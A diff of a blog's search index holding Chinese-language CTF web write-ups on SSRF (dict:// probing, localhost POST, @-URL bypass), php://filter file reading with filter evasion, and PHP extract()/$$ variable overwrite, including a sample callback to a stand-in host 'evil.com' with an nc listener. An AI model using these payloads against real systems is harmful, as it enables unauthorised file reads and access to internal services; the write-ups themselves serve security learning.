+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?dict:&#x2F;&#x2F;evil.com:1337&#x2F; </span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp&#x2F;*] </span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20201130140408511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20201130134217486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><code>?url=dict://127.0.0.1:§§</code>开始扫描<br>发现端口是8056.直接进行访问，就可以得到flag了。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201206135512184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p><img src="https://img-blog.csdnimg.cn/20201130135110568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201130135125582.png" alt="在这里插入图片描述"><code>?url=127.0.0.1/flag.php</code>尝试直接访问<br><img src="https://img-blog.csdnimg.cn/20201130135330773.png" alt="在这里插入图片描述">出现输入框<br><img src="https://img-blog.csdnimg.cn/20201130135426903.png" alt="在这里插入图片描述"><br>使用Burpsuite抓包，得到<br><img src="https://img-blog.csdnimg.cn/20201130135734268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- Debug: key&#x3D;6b82739ec82821b2d6bbc34b0af30d76--&gt;</span><br></pre></td></tr></table></figure>
+<p>且flag.php存在，将其输入输入框内</p>
+<p><img src="https://img-blog.csdnimg.cn/20201130135651735.png" alt="在这里插入图片描述"><br>得到提示从127.0.0.1查看，且题目提示POST方式</p>
+<p>使用POST方式通过127.0.0.1:80访问flag.php，且在底部输入所得到的<code>key=6b82739ec82821b2d6bbc34b0af30d76</code>即得到flag<br><img src="https://img-blog.csdnimg.cn/20201130140909273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h2><p><img src="https://img-blog.csdnimg.cn/20201206135056426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>http://www.baidu.com@192.168.0.1/</code>与<code>http://192.168.0.1</code>请求的都是<code>192.168.0.1</code>的内容。</p>
+<p>即构造<code>?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20201206135317719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>SSRF</tag>
+        <tag>SSRF相关知识</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SSRF</title>
     <url>/2020/12/06/SSRF/</url>
     <content><![CDATA[<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>参考：<br><img src="https://img-blog.csdnimg.cn/20201206022312978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
@@ -845,52 +845,6 @@
 
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>伪协议</title>
-    <url>/2020/12/06/%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a><code>php://filter</code></h2><p>可以说这是最常使用的一个伪协议，一般可以利用进行任意文件读取。<br><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 <code>readfile()</code>、 <code>file()</code> 和 <code>file_get_contents()</code>， 在数据流内容读取之前没有机会应用其他过滤器。<br><code>php://filter</code> 参数<br><img src="https://img-blog.csdnimg.cn/20201205234119421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">封装协议摘要（针对 <code>php://filter</code>，参考被筛选的封装器。）<br><img src="https://img-blog.csdnimg.cn/20201205234234658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="伪协议1"><a href="#伪协议1" class="headerlink" title="伪协议1"></a>伪协议1</h2><p><img src="https://img-blog.csdnimg.cn/20201205233656285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><code>?file=php://filter/read=convert.base64-encode/resource=flag</code><br>由题<code>preg_match()</code>函数过滤条件知道，过滤了php，base，但不区分大小写，因此<br><code>?file=pHp://filter/read=convert.bAse64-encode/resource=flag</code></p>
-<p><img src="https://img-blog.csdnimg.cn/20201205234924380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">解码得到flag：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">flag&#123;0f28b5d49b3020afeecd95b4009adf4c&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="str-replace-函数"><a href="#str-replace-函数" class="headerlink" title="str_replace() 函数"></a><code>str_replace()</code> 函数</h2><p><code>str_replace()</code> 函数替换字符串中的一些字符（区分大小写）。</p>
-<p><img src="https://img-blog.csdnimg.cn/20201205235441355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201205235514219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="伪协议2"><a href="#伪协议2" class="headerlink" title="伪协议2"></a>伪协议2</h2><p><img src="https://img-blog.csdnimg.cn/20201205235642902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><code>?file=php://filter/read=convert.base64-encode/resource=flag</code><br>由题<code>preg_match()</code>函数过滤条件知道，过滤了php，base，区分大小写，但由<code>str_replace()</code>函数知道”troye”会被替换成””因此<br><code>?file=phtroyep://filter/read=convert.bastroyee64-encode/resource=flag</code></p>
-<p><img src="https://img-blog.csdnimg.cn/20201206000220296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">解码得</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">flag&#123;8ec5af667b7be97ddeb18db02882607d&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>伪协议</tag>
-        <tag>str_replace()</tag>
-        <tag>php://filter</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php变量覆盖</title>
-    <url>/2020/11/28/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
-    <content><![CDATA[<p>参考：<a href="https://blog.csdn.net/qq_40657585/article/details/83545051">https://blog.csdn.net/qq_40657585/article/details/83545051</a></p>
-<h1 id="extract-漏洞"><a href="#extract-漏洞" class="headerlink" title="extract 漏洞"></a>extract 漏洞</h1><p><img src="https://img-blog.csdnimg.cn/20201127231919826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">extract()函数<br><img src="https://img-blog.csdnimg.cn/2020112723235148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201127233628583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>extract()漏洞</p>
-<p><img src="https://img-blog.csdnimg.cn/20201127232445879.png" alt="在这里插入图片描述">extract()函数引入变量，当冲突的时候，会引入新的变量，意思也就是覆盖原来的变量。</p>
-<p>数组中有同名元素的时候，会覆盖。</p>
-<p>extract()  获得一个get值是liwu。content从flag里获得一个去空的flag字符串。如果相等，输出flag。</p>
-<p>构造?liwu=&amp;flag=</p>
-<p><img src="https://img-blog.csdnimg.cn/20201127232853534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">flag{s0metimes^its-useful}</p>
-<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="$$漏洞"></a>$$漏洞</h1><p><img src="https://img-blog.csdnimg.cn/20201127233915736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020112723404853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">由于第8，12-15行间的代码会将$ flag的值给覆盖掉，所以只能利用第一个foreach先将$ flag的值赋给$ _200，然后利用die($ _200)将原本的flag值打印出来。<br><img src="https://img-blog.csdnimg.cn/20201127234546336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">flag{Variable_coverage_is_interesting}</p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>extract 漏洞</tag>
-        <tag>$$漏洞</tag>
-      </tags>
   </entry>
   <entry>
     <title>html（1）</title>
@@ -927,6 +881,52 @@
       <tags>
         <tag>HTTP</tag>
         <tag>HTTP相关知识</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php变量覆盖</title>
+    <url>/2020/11/28/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
+    <content><![CDATA[<p>参考：<a href="https://blog.csdn.net/qq_40657585/article/details/83545051">https://blog.csdn.net/qq_40657585/article/details/83545051</a></p>
+<h1 id="extract-漏洞"><a href="#extract-漏洞" class="headerlink" title="extract 漏洞"></a>extract 漏洞</h1><p><img src="https://img-blog.csdnimg.cn/20201127231919826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">extract()函数<br><img src="https://img-blog.csdnimg.cn/2020112723235148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201127233628583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>extract()漏洞</p>
+<p><img src="https://img-blog.csdnimg.cn/20201127232445879.png" alt="在这里插入图片描述">extract()函数引入变量，当冲突的时候，会引入新的变量，意思也就是覆盖原来的变量。</p>
+<p>数组中有同名元素的时候，会覆盖。</p>
+<p>extract()  获得一个get值是liwu。content从flag里获得一个去空的flag字符串。如果相等，输出flag。</p>
+<p>构造?liwu=&amp;flag=</p>
+<p><img src="https://img-blog.csdnimg.cn/20201127232853534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">flag{s0metimes^its-useful}</p>
+<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="$$漏洞"></a>$$漏洞</h1><p><img src="https://img-blog.csdnimg.cn/20201127233915736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020112723404853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">由于第8，12-15行间的代码会将$ flag的值给覆盖掉，所以只能利用第一个foreach先将$ flag的值赋给$ _200，然后利用die($ _200)将原本的flag值打印出来。<br><img src="https://img-blog.csdnimg.cn/20201127234546336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">flag{Variable_coverage_is_interesting}</p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>extract 漏洞</tag>
+        <tag>$$漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>伪协议</title>
+    <url>/2020/12/06/%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a><code>php://filter</code></h2><p>可以说这是最常使用的一个伪协议，一般可以利用进行任意文件读取。<br><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 <code>readfile()</code>、 <code>file()</code> 和 <code>file_get_contents()</code>， 在数据流内容读取之前没有机会应用其他过滤器。<br><code>php://filter</code> 参数<br><img src="https://img-blog.csdnimg.cn/20201205234119421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">封装协议摘要（针对 <code>php://filter</code>，参考被筛选的封装器。）<br><img src="https://img-blog.csdnimg.cn/20201205234234658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="伪协议1"><a href="#伪协议1" class="headerlink" title="伪协议1"></a>伪协议1</h2><p><img src="https://img-blog.csdnimg.cn/20201205233656285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><code>?file=php://filter/read=convert.base64-encode/resource=flag</code><br>由题<code>preg_match()</code>函数过滤条件知道，过滤了php，base，但不区分大小写，因此<br><code>?file=pHp://filter/read=convert.bAse64-encode/resource=flag</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20201205234924380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">解码得到flag：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">flag&#123;0f28b5d49b3020afeecd95b4009adf4c&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="str-replace-函数"><a href="#str-replace-函数" class="headerlink" title="str_replace() 函数"></a><code>str_replace()</code> 函数</h2><p><code>str_replace()</code> 函数替换字符串中的一些字符（区分大小写）。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201205235441355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201205235514219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="伪协议2"><a href="#伪协议2" class="headerlink" title="伪协议2"></a>伪协议2</h2><p><img src="https://img-blog.csdnimg.cn/20201205235642902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><code>?file=php://filter/read=convert.base64-encode/resource=flag</code><br>由题<code>preg_match()</code>函数过滤条件知道，过滤了php，base，区分大小写，但由<code>str_replace()</code>函数知道”troye”会被替换成””因此<br><code>?file=phtroyep://filter/read=convert.bastroyee64-encode/resource=flag</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20201206000220296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">解码得</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">flag&#123;8ec5af667b7be97ddeb18db02882607d&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>伪协议</tag>
+        <tag>str_replace()</tag>
+        <tag>php://filter</tag>
       </tags>
   </entry>
 </search>
